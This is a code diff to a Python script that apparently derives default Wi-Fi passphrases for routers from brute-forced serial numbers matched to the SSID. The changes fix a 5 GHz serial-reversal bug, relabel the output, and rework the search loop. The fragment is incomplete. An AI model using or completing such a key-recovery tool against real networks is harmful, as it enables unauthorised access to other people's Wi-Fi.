@@ -30,7 +30,7 @@ def generate_passphrase(serial, type):
     new_serial = serial 
 
     if (type == '5'):
-        new_serial = serial = serial[::-1]
+        new_serial = serial[::-1]
 
     m = hashlib.md5()
     m.update(new_serial.encode('utf-8'))
@@ -57,8 +57,11 @@ def generate_passphrase(serial, type):
     m = hashlib.md5()
     m.update(combined_hashes.encode('utf-8'))
     passphrase = convert_hash_to_pass(m.digest())
+    t = "2.4"
+    if (type == '5'): 
+        t = "  5"
 
-    print('[*] Found passphrase for', type, 'GHZ', new_serial, 'passphrase =', passphrase)
+    print('[*] Found passphrase for', t, 'GHZ', serial, 'passphrase =', passphrase)
 
 def mangle(d1, d2, d3, d4):
     a = ((d4 * magic1) >> 40) - (d4 >> 31)
@@ -102,5 +105,7 @@ def check(s1, s2, s3, s4):
 for s1 in range(0,10):
     for s2 in range(0,100):
         for s3 in range(0,10):
-            for s4 in range(0,100):
-                check(s1, s2, s3, s4 * 100 + last_two_digits_of_target)
+            for s4 in range(0,10000):
+                # are the last 2 digits the same as the last 2 digits on the SSID
+                if (s4 - last_two_digits_of_target) % 100 == 0:
+                    check(s1, s2, s3, s4)
